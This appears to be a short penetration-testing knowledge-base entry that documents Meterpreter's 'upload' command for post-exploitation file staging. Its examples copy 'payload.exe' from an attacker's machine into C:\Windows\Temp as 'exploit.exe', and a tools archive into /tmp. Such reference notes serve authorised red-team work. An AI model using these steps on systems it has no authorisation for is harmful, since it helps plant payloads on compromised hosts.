---
type: command
executor: meterpreter
data: upload /local/path/to/source_file /remote/path/destination_file
tags:
  - Meterpreter
  - File-Transfer
  - Upload
platforms:
  - Windows
  - Linux
  - macOS
verified: true
validated: true
---

# meterpreter-upload-file

## Command

```meterpreter
upload /local/path/to/source_file /remote/path/destination_file
```

## Description

This command uploads a file from the attacker's local machine to the target system via the Meterpreter session. It supports renaming the file on the target and is executed within an active Meterpreter shell for post-exploitation file staging.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `/local/path/to/source_file` | Full path to the file on the attacker's machine | Yes |
| `/remote/path/destination_file` | Destination path and filename on the target (can rename) | Yes |

## Examples

### Basic Usage

```meterpreter
upload /home/attacker/payload.exe C:\Windows\Temp\exploit.exe
```

### Advanced Usage

```meterpreter
upload /home/attacker/tools.zip /tmp/tools.zip
```

## Expected Output

[*] Uploaded /home/attacker/payload.exe to C:\Windows\Temp\exploit.exe (12345 bytes)

Meterpreter will display the number of bytes transferred and confirm completion if successful. Errors may occur if paths are invalid or permissions are insufficient.

## Related

- [[procedures/Meterpreter-File-Transfer]]
- [[commands/meterpreter-download-file]]
